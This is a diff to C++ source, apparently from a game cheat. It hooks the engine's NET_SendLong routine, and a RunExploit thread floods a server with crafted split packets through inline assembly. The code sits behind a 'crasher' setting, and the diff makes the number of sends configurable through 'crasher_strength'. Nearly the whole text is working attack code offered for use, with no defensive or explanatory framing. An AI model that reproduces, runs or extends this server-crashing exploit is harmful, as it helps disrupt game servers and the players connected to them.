@@ -15,19 +15,12 @@
 
 #define MAX_SPLITPACKET_SPLITS ( NET_MAX_MESSAGE / MIN_SPLIT_SIZE )
 
-struct ARGS {
-	void* netchann;
-	DWORD* socket;
-	int nBytesLeft;
-	int nMaxRoutableSize;
-} ARGS_KEEP;
-
-bool bDontProcessConnectionless = false;
 bool shouldCall = true;
 int counter = 0;
-char* packetbuf = NULL;
+void* netchann;
+char* packetbuf = 0;
 
-int CUSTOM_NET_SendLong(void* netchan, unsigned char* sendbuf, int sendlen, int nMaxRoutableSize, bool Encrypt = false, bool Decrypt = true) {
+int __fastcall CUSTOM_NET_SendLong(void* Calls_SendToImpl, void* netchan, unsigned char* sendbuf, int sendlen, int nMaxRoutableSize) {
 
 	short nSplitSizeMinusHeader = nMaxRoutableSize - sizeof(SPLITPACKET);
 
@@ -70,7 +63,7 @@ int CUSTOM_NET_SendLong(void* netchan, unsigned char* sendbuf, int sendlen, int 
 		int To = -2;
 		int* toAddr = &To;
 		int ASMSIZE = size + 12;
-		void* callSentToPtr = (void*)M::Calls_SendToImpl;
+		void* callSentToPtr = (void*)Calls_SendToImpl;
 
 		__asm {
 			mov     eax, ASMSIZE
@@ -119,12 +112,9 @@ unsigned int __stdcall RunExploit(void*) {
 			return 0;
 		memcpy(packetbuf + sizeof(SPLITPACKET), (void*)((uintptr_t)Packet), size);
 	}
-	SPLITPACKET* to_split = (SPLITPACKET*)packetbuf;
 
-	//TODO: add config for timesToSend(500)
-	for (int i = 0; (i < 500) && Cfg::c.misc.crasher; i++) {
-		bDontProcessConnectionless = true;
-		CUSTOM_NET_SendLong(ARGS_KEEP.netchann, (unsigned char*)packetbuf + sizeof(SPLITPACKET), 13, 576);
+	for (int i = 0; (i < Cfg::c.misc.crasher_strength) && Cfg::c.misc.crasher; i++) {
+		CUSTOM_NET_SendLong((void*)M::Calls_SendToImpl, netchann, (unsigned char*)packetbuf + sizeof(SPLITPACKET), 13, 576);
 	}
 	shouldCall = true;
 	return 0;
@@ -133,10 +123,8 @@ unsigned int __stdcall RunExploit(void*) {
 f_NET_SendLong H::oNET_SendLong;
 
 int __fastcall H::Hooked_NET_SendLong(void* netchannel, DWORD* socket, int nBytesLeft, int nMaxRoutableSize) {
-	ARGS_KEEP.netchann = netchannel;
-	ARGS_KEEP.socket = socket;
-	ARGS_KEEP.nBytesLeft = nBytesLeft;
-	ARGS_KEEP.nMaxRoutableSize = nMaxRoutableSize;
+
+	netchann = netchannel;
 
 	if (Cfg::c.misc.crasher) {
 		if (counter >= 2) {
@@ -148,7 +136,7 @@ int __fastcall H::Hooked_NET_SendLong(void* netchannel, DWORD* socket, int nByte
 		counter++;
 	}
 
-	return CUSTOM_NET_SendLong(netchannel, (unsigned char*)socket, nBytesLeft, 576);
+	return CUSTOM_NET_SendLong((void*)M::Calls_SendToImpl, netchannel, (unsigned char*)socket, nBytesLeft, 576);
 }
 
 f_ProcessConnectionless H::oProcessConnectionless;
